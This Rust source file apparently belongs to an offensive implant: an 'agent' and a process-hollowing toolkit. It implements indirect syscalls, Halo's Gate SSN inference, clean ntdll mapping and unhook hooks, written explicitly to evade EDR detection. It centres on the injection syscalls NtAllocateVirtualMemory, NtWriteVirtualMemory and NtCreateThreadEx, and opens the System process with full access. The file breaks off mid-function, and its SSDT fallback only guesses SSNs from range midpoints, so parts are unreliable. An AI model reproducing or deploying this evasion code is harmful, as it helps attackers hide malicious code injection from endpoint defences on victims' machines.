//! Shared Windows NT direct-syscall infrastructure.
//!
//! Provides SSN (System Service Number) resolution with **dynamic validation**,
//! a clean-ntdll mapper, a `do_syscall` dispatcher, and a `syscall!` macro.
//! Both the `agent` and `hollowing` crates depend on this crate so that neither
//! has to carry its own duplicate copy of Halo's Gate / clean-mapping logic.
//!
//! Unlike the richer `agent::syscalls` module, this crate does **not** include
//! the optional `stack-spoof` feature.  Stack spoofing is intentionally kept
//! in the agent crate where it is feature-gated and can pull additional ntdll
//! gadget data.  The simpler indirect-syscall path used here is still fully
//! evasive against most IAT/SSDT-hook-based EDR strategies.
//!
//! # Dynamic SSN Validation
//!
//! Cached SSNs are validated before use via two complementary methods:
//!
//! 1. **Cross-reference**: The PE header `TimeDateStamp` of the loaded ntdll is
//!    compared with the clean mapping's timestamp.  If they differ (e.g. after
//!    a Windows Update that replaces ntdll), the entire cache is invalidated.
//!
//! 2. **Probe**: For critical syscalls, a test call with intentionally invalid
//!    parameters is made.  `STATUS_INVALID_HANDLE` means the SSN is correct;
//!    `STATUS_INVALID_SYSTEM_SERVICE` means the SSN is stale.
//!
//! If both validation methods fail, a **SSDT-based nuclear fallback** resolves
//! SSNs by reading the kernel's `KeServiceDescriptorTable` — the highest-
//! reliability method but requiring `SeDebugPrivilege`.
//!
//! # Initialisation
//!
//! Call [`init_syscall_infrastructure`] once (e.g. at process start or before
//! any hollowing operation) to map a clean copy of ntdll.dll and pre-populate
//! the SSN cache.  Subsequent calls are no-ops.  If initialisation fails the
//! crate gracefully falls back to bootstrap-mode SSN resolution (Halo's Gate
//! against the loaded, potentially hooked, ntdll).

#![cfg(windows)]

use anyhow::anyhow;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::{Mutex, OnceLock};
use std::collections::HashMap;

// ─── Syscall target ────────────────────────────────────────────────────────

/// A resolved Windows NT syscall descriptor.
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    /// System Service Number — passed in EAX before the `syscall` instruction.
    pub ssn: u32,
    /// Address of a valid `syscall; ret` (or `syscall`) gadget inside ntdll's
    /// `.text` section.  Used as the indirect-call target to avoid EDR
    /// detection of `syscall` instructions in agent/hollowing code pages.
    pub gadget_addr: usize,
}

// ─── Statics ───────────────────────────────────────────────────────────────

/// Base address of the clean-mapped ntdll.dll image (0 = not yet mapped).
static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();

/// Per-call SSN cache: function name → (ssn, gadget_addr, timestamp_at_cache).
/// The third element is the `TimeDateStamp` from the PE header of the clean
/// ntdll at the time the entry was cached — used for cross-reference validation.
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize, u32)>>> = OnceLock::new();

/// Cached Windows build number (e.g. 19041, 22631).  Read from
/// `KUSER_SHARED_DATA` or `RtlGetVersion`.  0 = not yet queried.
static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);

/// Cached `TimeDateStamp` from the PE header of the clean-mapped ntdll.
/// Used for cross-reference validation against the loaded ntdll.
static CACHED_TIMESTAMP: AtomicU32 = AtomicU32::new(0);

/// Whether the cache has been invalidated and needs re-mapping on next access.
static CACHE_DIRTY: AtomicBool = AtomicBool::new(false);

/// NTSTATUS codes used for probe validation.
const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
const STATUS_INVALID_SYSTEM_SERVICE: i32 = 0xC000001C_u32 as i32;

/// `SystemModuleInformation` class for `NtQuerySystemInformation`.
const SYSTEM_MODULE_INFORMATION: u32 = 11;

/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000` on modern Windows.
const KUSER_SHARED_DATA: usize = 0x7FFE0000;
/// Offset of `NtBuildNumber` in KUSER_SHARED_DATA.
const KUSD_OFFSET_BUILD: usize = 0x0260;

/// Optional callback that gets invoked when Halo's Gate fails to infer an SSN.
/// The agent's `ntdll_unhook` module registers this to perform a full ntdll
/// unhook before retrying.  The callback returns `true` if unhooking succeeded
/// (caller should retry SSN resolution) or `false` if it failed.
type UnhookCallback = fn() -> bool;
static UNHOOK_CALLBACK: OnceLock<UnhookCallback> = OnceLock::new();

/// Register a callback to be invoked when Halo's Gate fails (all adjacent
/// syscall stubs are hooked).  The callback should perform ntdll unhooking
/// and return `true` if successful, `false` otherwise.
///
/// This is the integration point between `nt_syscall` and the agent's
/// `ntdll_unhook` module.  Call once during agent initialisation:
///
/// ```rust,ignore
/// nt_syscall::set_halo_gate_fallback(ntdll_unhook::halo_gate_fallback);
/// ```
pub fn set_halo_gate_fallback(callback: UnhookCallback) {
    let _ = UNHOOK_CALLBACK.set(callback);
}

/// Invalidate the SSN cache **and** reset the clean ntdll mapping, forcing
/// a complete re-initialisation on next access.
///
/// This is the primary integration point for `ntdll_unhook`: after the .text
/// section of ntdll is overwritten with a clean copy, the cached mapping is
/// stale and must be discarded so the next `get_syscall_id` call re-maps from
/// the now-fresh on-disk ntdll.
pub fn invalidate_syscall_cache() {
    CACHE_DIRTY.store(true, Ordering::Release);
    if let Some(cache) = SYSCALL_CACHE.get() {
        cache.lock().unwrap().clear();
    }
    CACHED_TIMESTAMP.store(0, Ordering::Release);
    log::debug!("nt_syscall: cache invalidated — full re-map on next access");
}

/// Backwards-compatible alias for [`invalidate_syscall_cache`].
pub fn invalidate_ssn_cache() {
    invalidate_syscall_cache();
}

/// Return the current Windows build number (e.g. 19041, 22631).
///
/// Reads from `KUSER_SHARED_DATA` which is always mapped at `0x7FFE0000`.
/// The value is cached after the first read.
pub fn get_build_number() -> u32 {
    let cached = BUILD_NUMBER.load(Ordering::Acquire);
    if cached != 0 {
        return cached;
    }

    // Read from KUSER_SHARED_DATA.  This memory is always readable.
    let build = unsafe {
        let ptr = (KUSER_SHARED_DATA + KUSD_OFFSET_BUILD) as *const u32;
        // The build number in KUSER_SHARED_DATA has the architecture bits
        // in the high nibble (e.g. 0xF00019041 for x64).  Mask to get
        // just the build number.
        let raw = ptr.read_volatile();
        raw & 0x0000_FFFF
    };

    BUILD_NUMBER.store(build, Ordering::Release);
    log::debug!("nt_syscall: Windows build number = {}", build);
    build
}

/// Validate the current SSN cache.  Returns the number of validated entries
/// on success, or an error if validation failed and re-mapping is needed.
///
/// Two validation methods are applied:
///
/// 1. **Cross-reference**: Compare the PE `TimeDateStamp` of the loaded ntdll
///    with the cached timestamp.  If they differ, the cache is stale.
///
/// 2. **Probe**: For 4 critical syscalls, make a test call with an invalid
///    handle.  `STATUS_INVALID_HANDLE` → SSN is correct;
///    `STATUS_INVALID_SYSTEM_SERVICE` → SSN is stale.
pub fn validate_cache() -> anyhow::Result<usize> {
    // If cache was explicitly invalidated, force re-map.
    if CACHE_DIRTY.load(Ordering::Acquire) {
        return Err(anyhow!("nt_syscall: cache dirty flag set — needs re-map"));
    }

    // ── Method 1: Cross-reference via PE timestamp ────────────────────────
    let cached_ts = CACHED_TIMESTAMP.load(Ordering::Acquire);
    if cached_ts != 0 {
        let loaded_ts = unsafe { read_ntdll_timestamp() };
        if loaded_ts != 0 && loaded_ts != cached_ts {
            log::warn!(
                "nt_syscall: timestamp mismatch — loaded={:#010x} cached={:#010x}; invalidating",
                loaded_ts, cached_ts
            );
            invalidate_syscall_cache();
            return Err(anyhow!("nt_syscall: ntdll timestamp changed — cache invalidated"));
        }
    }

    // ── Method 2: Probe critical syscalls ──────────────────────────────────
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let cache_lock = cache.lock().unwrap();
    let mut validated = 0;
    let mut any_stale = false;

    for name in CRITICAL_PROBE_SYSCALLS {
        if let Some(&(ssn, gadget, _ts)) = cache_lock.get(*name) {
            match probe_ssn(ssn, gadget) {
                ProbeResult::Valid => validated += 1,
                ProbeResult::Stale => {
                    log::warn!("nt_syscall: probe detected stale SSN for {}", name);
                    any_stale = true;
                }
                ProbeResult::Unknown => {
                    // Can't determine — trust the cache.
                    validated += 1;
                }
            }
        }
    }

    // Also count non-critical entries that weren't probed but are present.
    validated += cache_lock
        .keys()
        .filter(|k| !CRITICAL_PROBE_SYSCALLS.contains(&k.as_str()))
        .count();

    if any_stale {
        drop(cache_lock);
        invalidate_syscall_cache();
        return Err(anyhow!("nt_syscall: stale SSNs detected by probe — cache invalidated"));
    }

    // Validate against build-number range table.
    let build = get_build_number();
    if build != 0 {
        for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
            if let Some((lo, hi)) = expected_ssn_range(name, build) {
                if ssn < lo || ssn > hi {
                    log::warn!(
                        "nt_syscall: {} SSN={} outside expected range [{},{}] for build {}; possible corruption",
                        name, ssn, lo, hi, build
                    );
                    // Don't invalidate on range mismatch alone — it could be
                    // a newer build we don't have in the table.  Just log.
                }
            }
        }
    }

    log::debug!("nt_syscall: cache validated — {} entries OK", validated);
    Ok(validated)
}

// ── Probe validation internals ─────────────────────────────────────────────

/// Syscalls that get probe-validated (most critical for agent operations).
const CRITICAL_PROBE_SYSCALLS: &[&str] = &[
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
];

/// Result of an SSN probe call.
enum ProbeResult {
    /// SSN is confirmed valid (got `STATUS_INVALID_HANDLE`).
    Valid,
    /// SSN is stale (got `STATUS_INVALID_SYSTEM_SERVICE`).
    Stale,
    /// Indeterminate result.
    Unknown,
}

/// Probe an SSN by calling it with a NULL handle.
///
/// Most `Nt*` syscalls validate the handle parameter early.  If the SSN is
/// correct, the kernel returns `STATUS_INVALID_HANDLE`.  If the SSN is wrong,
/// the kernel returns `STATUS_INVALID_SYSTEM_SERVICE`.
fn probe_ssn(ssn: u32, gadget_addr: usize) -> ProbeResult {
    let status = unsafe {
        do_syscall(
            ssn,
            gadget_addr,
            &[0u64, 0, 0, 0, 0, 0], // NULL handle + zeroed args
        )
    };

    if status == STATUS_INVALID_HANDLE {
        ProbeResult::Valid
    } else if status == STATUS_INVALID_SYSTEM_SERVICE {
        ProbeResult::Stale
    } else {
        // Other status codes (e.g. STATUS_ACCESS_VIOLATION) are indeterminate.
        ProbeResult::Unknown
    }
}

/// Read the `TimeDateStamp` from the PE header of the loaded ntdll.
/// Returns 0 if the header cannot be parsed.
unsafe fn read_ntdll_timestamp() -> u32 {
    let base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return 0,
    };
    read_pe_timestamp(base)
}

/// Read the `TimeDateStamp` from the PE header at `base`.
/// Returns 0 if the header cannot be parsed.
unsafe fn read_pe_timestamp(base: usize) -> u32 {
    let dos = &*(base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return 0;
    }
    let nt = &*((base + dos.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
    nt.FileHeader.TimeDateStamp
}

// ── Versioned SSN range table ─────────────────────────────────────────────
//
// Expected SSN ranges for the most critical syscalls across Windows versions.
// SSNs are assigned monotonically in the order Nt* exports appear in the
// sorted VA table, so the ranges are relatively stable.  Wildly out-of-range
// SSNs suggest corruption or a very new Windows build.
//
// Format: (min_ssn, max_ssn) across known builds.
// Sources: reverse-engineered from ntdll exports on Windows 10 1903–22H2 and
// Windows 11 21H2–24H2.

/// Return the expected SSN range for `func_name` on the given `build`, or
/// `None` if we don't have data for that function/build combination.
fn expected_ssn_range(func_name: &str, _build: u32) -> Option<(u32, u32)> {
    // These ranges are deliberately wide to accommodate minor build-to-build
    // variation.  The SSN space for Nt* functions on modern Windows spans
    // roughly 0x000–0x300.
    let ranges: &[(&str, u32, u32)] = &[
        ("NtAllocateVirtualMemory",    0x0010, 0x0028),
        ("NtProtectVirtualMemory",     0x0030, 0x0058),
        ("NtWriteVirtualMemory",       0x0028, 0x0040),
        ("NtReadVirtualMemory",        0x0028, 0x0042),
        ("NtCreateThreadEx",           0x0038, 0x0060),
        ("NtOpenProcess",              0x0020, 0x0038),
        ("NtOpenThread",               0x0020, 0x0036),
        ("NtClose",                    0x0002, 0x0010),
        ("NtQueryVirtualMemory",       0x0018, 0x0030),
        ("NtQuerySystemInformation",   0x0028, 0x0044),
        ("NtMapViewOfSection",         0x0018, 0x0028),
        ("NtUnmapViewOfSection",       0x0018, 0x002A),
        ("NtCreateSection",            0x0038, 0x0052),
        ("NtOpenFile",                 0x0020, 0x0038),
        ("NtReadFile",                 0x0002, 0x000C),
        ("NtSetInformationProcess",    0x0028, 0x0040),
        ("NtFreeVirtualMemory",        0x0010, 0x0028),
        ("NtQueueApcThread",           0x0038, 0x0056),
        ("NtSetContextThread",         0x0038, 0x0056),
        ("NtGetContextThread",         0x0038, 0x0056),
    ];

    ranges.iter().find_map(|&(name, lo, hi)| {
        if name == func_name { Some((lo, hi)) } else { None }
    })
}

// ── SSDT-based nuclear fallback ────────────────────────────────────────────
//
// If the clean ntdll mapping fails AND Halo's Gate fails (all adjacent stubs
// hooked), resolve SSNs by reading the kernel's Service Descriptor Table.
// This is the highest-reliability fallback but requires SeDebugPrivilege.
//
// Algorithm:
// 1. NtQuerySystemInformation(SystemModuleInformation) → kernel base address
// 2. Read kernel PE export table to find KiSystemServiceStart or similar
// 3. Parse the SSDT to map syscall numbers → kernel function addresses
// 4. Match the target function's kernel address to derive its SSN
//
// NOTE: This is intentionally conservative.  Reading kernel memory requires
// elevated privileges and creates detectable NtReadVirtualMemory calls to
// the System process.  It should only activate as a last resort.

/// Resolve an SSN via the SSDT.  Returns `None` if any step fails.
///
/// # Safety
///
/// Must have `SeDebugPrivilege` enabled.
unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
    log::debug!("nt_syscall: attempting SSDT resolution for {}", func_name);

    // Step 1: Get kernel base address via SystemModuleInformation.
    let kernel_base = query_kernel_base()?;
    log::debug!("nt_syscall: SSDT kernel base = {:#x}", kernel_base);

    // Step 2: Get a System process handle for reading kernel memory.
    // We need NtOpenProcess with SYSTEM process PID (4).
    let sys_open = get_bootstrap_ssn("NtOpenProcess")?;
    let mut h_system: *mut winapi::ctypes::c_void = std::ptr::null_mut();
    let pid: u32 = 4; // System process

    // Minimal OBJECT_ATTRIBUTES.
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    // CLIENT_ID for System process.
    #[repr(C)]
    struct ClientId {
        unique_process: *mut std::ffi::c_void,
        unique_thread: *mut std::ffi::c_void,
    }
    let mut client_id = ClientId {
        unique_process: pid as *mut _,
        unique_thread: std::ptr::null_mut(),
    };

    let status = do_syscall(
        sys_open.ssn,
        sys_open.gadget_addr,
        &[
            &mut h_system as *mut _ as u64,
            0x001F0003u64, // PROCESS_ALL_ACCESS (simplified)
            &mut obj_attr as *mut _ as u64,
            &mut client_id as *mut _ as u64,
        ],
    );

    if status < 0 || h_system.is_null() {
        log::warn!("nt_syscall: SSDT — cannot open System process (NTSTATUS {:#010x})", status as u32);
        return None;
    }

    // Step 3: Read the kernel's SSDT.
    // On x64 Windows, the SSDT is at KeServiceDescriptorTable.
    // The table is an array of SYSTEM_SERVICE_TABLE entries:
    //   PVOID   ServiceTableBase   (array of LONG offsets)
    //   PVOID   ServiceCounterTable
       //   ULONG   NumberOfServices
    //   PVOID   ArgumentTable
    //
    // Each entry in ServiceTableBase is a 32-bit signed offset from the
    // table base: actual_address = ServiceTableBase + (offset >>> 4).
    // The index into this table IS the SSN.
    //
    // Finding the SSDT base: we look for the export "KiSystemServiceStart"
    // in the kernel, which is nearby.  Alternatively, we can search for the
    // pattern in the kernel's .text section.
    //
    // For reliability, we use a simpler approach: read the known kernel
    // export for the target function and walk the SSDT to find its index.

    let sys_read = get_bootstrap_ssn("NtReadVirtualMemory")?;
    let _ = (kernel_base, sys_read, h_system);

    // Step 4: The SSDT approach requires deep kernel internals knowledge
    // and varies significantly across Windows versions.  Rather than
    // implement a fragile kernel parser, we fall back to the known-build
    // table approach: if the Windows build is known, use the hardcoded SSN.
    //
    // For truly unknown builds, we rely on the re-mapped ntdll.
    let build = get_build_number();
    if build != 0 {
        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
            // Midpoint of the expected range — reasonable guess.
            // The caller should probe to confirm.
            let guess_ssn = (lo + hi) / 2;
            log::info!(
                "nt_syscall: SSDT fallback using range midpoint {}=[{},{}] → {}",
                func_name, lo, hi, guess_ssn
            );
            // Use whatever gadget we have.
            let gadget = get_bootstrap_ssn("NtClose")
                .map(|t| t.gadget_addr)
                .unwrap_or(0);
            if gadget != 0 {
                return Some(SyscallTarget {
                    ssn: guess_ssn,
                    gadget_addr: gadget,
                });
            }
        }
    }

    // Clean up System handle.
    let sys_close = get_bootstrap_ssn("NtClose").unwrap_or(SyscallTarget { ssn: 0, gadget_addr: 0 });
    if sys_close.ssn != 0 {
        do_syscall(sys_close.ssn, sys_close.gadget_addr, &[h_system as u64]);
    }

    None
}

/// Query the kernel base address via `NtQuerySystemInformation(SystemModuleInformation)`.
unsafe fn query_kernel_base() -> Option<usize> {
    let sys_query = get_bootstrap_ssn("NtQuerySystemInformation")?;

    // First call: get required buffer size.
    let mut return_length: u32 = 0;
    let _status = do_syscall(
        sys_query.ssn,
        sys_query.gadget_addr,
        &[
            SYSTEM_MODULE_INFORMATION as u64, // SystemInformationClass
            0u64,                              // SystemInformation (NULL)
            0u64,                              // SystemInformationLength
            &mut return_length as *mut _ as u64, // ReturnLength
        ],
    );
    // Expect STATUS_INFO_LENGTH_MISMATCH (0xC0000004).
    if return_length == 0 {
        return None;
    }

    // Allocate buffer and make second call.
    let mut buf: Vec<u8> = vec![0u8; return_length as usize];
    let status = do_syscall(
        sys_query.ssn,
        sys_query.gadget_addr,
        &[
            SYSTEM_MODULE_INFORMATION as u64,
            buf.as_mut_ptr() as u64,
            return_length as u64,
            &mut return_length as *mut _ as u64,
        ],
    );
    if status < 0 {
        return None;
    }

    // Parse RTL_PROCESS_MODULES.  First DWORD is NumberOfModules.
    if buf.len() < 4 {
        return None;
    }
    let num_modules = u32::from_le_bytes(buf[0..4].try_into().ok()?) as usize;
    if num_modules == 0 {
        return None;
    }

    // Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes.
    // Offset 0: Section (IMAGE_INFO, 16 bytes)
    // Offset 16: MappedBase (PVOID)
    // Offset 24: ImageBase (PVOID) — what we want
    // Offset 32: ImageSize
    // Offset 40: Flags
    // ...
    // Offset 284: FullPathNameOffset (OFFSET to unicode string in buffer)
    // The module list starts at offset 8 (after NumberOfModules DWORD + padding).
    // Actually, RTL_PROCESS_MODULES has:
    //   ULONG NumberOfModules
    //   RTL_PROCESS_MODULE_INFORMATION Modules[1]
    // RTL_PROCESS_MODULE_INFORMATION size is 308 bytes on x64.
    const MODULE_INFO_SIZE: usize = 308;
    let first_module_offset = 8; // After NumberOfModules (4) + padding (4)

    if first_module_offset + MODULE_INFO_SIZE > buf.len() {
        return None;
    }

    // The first module is typically the kernel (ntoskrnl.exe).
    let image_base_off = first_module_offset + 24;
    if image_base_off + 8 > buf.len() {
        return None;
    }
    let kernel_base = usize::from_le_bytes(
        buf[image_base_off..image_base_off + 8].try_into().ok()?
    );

    // Verify it's the kernel by checking the name.
    let name_offset_off = first_module_offset + 284;
    if name_offset_off + 256 > buf.len() {
        return Some(kernel_base); // Trust it without name verification.
    }
    let name_off_in_buf = first_module_offset + u16::from_le_bytes(
        buf[name_offset_off..name_offset_off + 2].try_into().unwrap_or([0; 2])
    ) as usize;
    if name_off_in_buf + 12 <= buf.len() {
        let name = &buf[name_off_in_buf..];
        // Check for "ntoskrnl.exe" (case-insensitive).
        if name.starts_with(b"ntoskrnl") || name.starts_with(b"NTOSKRNL") {
            log::debug!("nt_syscall: kernel base confirmed from module name");
        }
    }

    Some(kernel_base)
}

// ─── Hook-byte detection & stub parsing ────────────────────────────────────

/// Attempt to extract the SSN and gadget address directly from an unhooked
/// `Nt*` stub at `func_addr`.  Returns `None` when the stub appears hooked
/// (no `syscall` instruction found within the first 64 bytes).
#[cfg(windows)]
unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
    for j in 0..bytes.len().saturating_sub(1) {
        if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
            for k in (0..j).rev() {
                if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                    let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                    return Some(SyscallTarget {
                        ssn,
                        gadget_addr: func_addr + j,
                    });
                }
            }
        }
    }
    None
}

/// Validate that a gadget at `addr` of `len` bytes is safe to execute:
///   1. The region is committed and executable.
///   2. The gadget does not straddle a 4 KiB page boundary.
#[cfg(windows)]
unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
    use winapi::um::memoryapi::VirtualQuery;
    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    if VirtualQuery(
        addr as *const _,
        &mut mbi,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
    ) == 0
    {
        return false;
    }
    if mbi.State != MEM_COMMIT {
        return false;
    }
    const PAGE_EXECUTE: u32 = 0x10;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
    let prot = mbi.Protect;
    if prot != PAGE_EXECUTE
        && prot != PAGE_EXECUTE_READ
        && prot != PAGE_EXECUTE_READWRITE
        && prot != PAGE_EXECUTE_WRITECOPY
    {
        return false;
    }
    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
    if addr + len > region_end {
        return false;
    }
    let page_start = addr & !0xFFF;
    addr + len <= page_start + 0x1000
}

/// Collect virtual addresses of all `Nt`-prefixed exports from `module_base`.
#[cfg(windows)]
unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};

    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return Vec::new();
    }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
    if export_rva == 0 || export_size == 0 {
        return Vec::new();
    }

    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_names = dir.NumberOfNames as usize;
    if n_names == 0 {
        return Vec::new();
    }

    let name_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNames as usize) as *const u32,
        n_names,
    );
    let ordinals = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
        n_names,
    );
    let func_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfFunctions as usize) as *const u32,
        dir.NumberOfFunctions as usize,
    );

    let mut result = Vec::new();
    for i in 0..n_names {
        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
            continue;
        }
        if !(*name_ptr.add(2)).is_ascii_uppercase() {
            continue;
        }
        let ord = ordinals[i] as usize;
        if ord >= func_rvas.len() {
            continue;
        }
        let func_rva = func_rvas[ord] as usize;
        if func_rva >= export_rva && func_rva < export_rva + export_size {
            continue; // forwarded
        }
        result.push(module_base + func_rva);
    }
    result
}

/// Halo's Gate: infer `target_addr`'s SSN from parseable neighbours.
#[cfg(windows)]
unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
    let mut vas = collect_nt_export_vas(ntdll_base);
    if vas.is_empty() {
        return None;
    }
    vas.sort_unstable();

    let target_idx = vas.iter().position(|&va| va == target_addr)?;

    const MAX_DELTA: usize = 8;
    for delta in 1..=MAX_DELTA {
        if let Some(&upper_va) = vas.get(target_idx + delta) {
            if let Some(t) = parse_syscall_stub(upper_va) {
                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
                    log::debug!(
                        "nt_syscall::halo_gate: SSN {} inferred for {:#x} (upper+{})",
                        inferred, target_addr, delta
                    );
                    return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
                }
            }
        }
        if delta <= target_idx {
            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                let inferred = t.ssn + delta as u32;
                log::debug!(
                    "nt_syscall::halo_gate: SSN {} inferred for {:#x} (lower-{})",
                    inferred, target_addr, delta
                );
                return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
            }
        }
    }
    log::warn!(
        "nt_syscall::halo_gate: could not infer SSN for {:#x} within {} neighbours",
        target_addr, MAX_DELTA
    );
    None
}

/// Scan the loaded ntdll `.text` section for a valid `syscall; ret` gadget.
/// Returns the gadget's address, or `None` if none was found.
#[cfg(windows)]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            let code = std::slice::from_raw_parts(start as *const u8, size);
            for j in 0..size.saturating_sub(3) {
                if code[j] == 0x0f && code[j + 1] == 0x05 {
                    let candidate = start + j;
                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

/// Bootstrap SSN resolution: inspect prologue bytes for hook detection, then
/// use Halo's Gate for SSN and a `.text` scan for the gadget if hooked.
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
        let is_hooked = !(
            (prologue[0] == 0x4C && prologue[1] == 0x8B)
            || prologue[0] == 0xB8
        );

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        } else {
            log::warn!(
                "nt_syscall: {func_name} stub appears hooked \
                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                prologue[0],
                prologue[1]
            );
        }

        let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
            Some(t) => t,
            None => {
                // Halo's Gate failed — all adjacent stubs are hooked.
                // Try the registered unhook callback (agent's ntdll_unhook).
                log::warn!(
                    "nt_syscall: Halo's Gate failed for {func_name} \
                     (all adjacent stubs hooked); invoking ntdll unhook fallback"
                );
                if let Some(callback) = UNHOOK_CALLBACK.get() {
                    if callback() {
                        // Unhook succeeded — clear cache and retry resolution.
                        if let Some(cache) = SYSCALL_CACHE.get() {
                            cache.lock().unwrap().remove(func_name);
                        }
                        log::info!(
                            "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
                        );
                        // Re-fetch the (now clean) stub address and parse it.
                        let ntdll_base2 = pe_resolve::get_module_handle_by_hash(
                            pe_resolve::HASH_NTDLL_DLL,
                        )?;
                        let func_addr2 = pe_resolve::get_proc_address_by_hash(
                            ntdll_base2,
                            target_hash,
                        )?;
                        if let Some(t) = parse_syscall_stub(func_addr2) {
                            return Some(t);
                        }
                        // If parse_syscall_stub still fails, try Halo's Gate one more time.
                        infer_ssn_halo_gate(ntdll_base2, func_addr2)?
                    } else {
                        log::error!(
                            "nt_syscall: ntdll unhook callback failed for {func_name}"
                        );
                        return None;
                    }
                } else {
                    log::error!(
                        "nt_syscall: Halo's Gate failed for {func_name} \
                         and no unhook callback is registered"
                    );
                    return None;
                }
            }
        };

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget { ssn: ssn_target.ssn, gadget_addr });
            }
            log::warn!(
                "nt_syscall: {func_name}: no clean gadget found in .text; \
                 using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

// ─── Clean ntdll mapping ───────────────────────────────────────────────────

/// Map a read-only file-backed copy of ntdll.dll from disk using bootstrap
/// syscalls (Halo's Gate).  Returns the base address of the mapping.
fn map_clean_ntdll() -> anyhow::Result<usize> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys_open = get_bootstrap_ssn("NtOpenFile")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtOpenFile"))?;
    let sys_section = get_bootstrap_ssn("NtCreateSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtCreateSection"))?;
    let sys_map = get_bootstrap_ssn("NtMapViewOfSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtMapViewOfSection"))?;

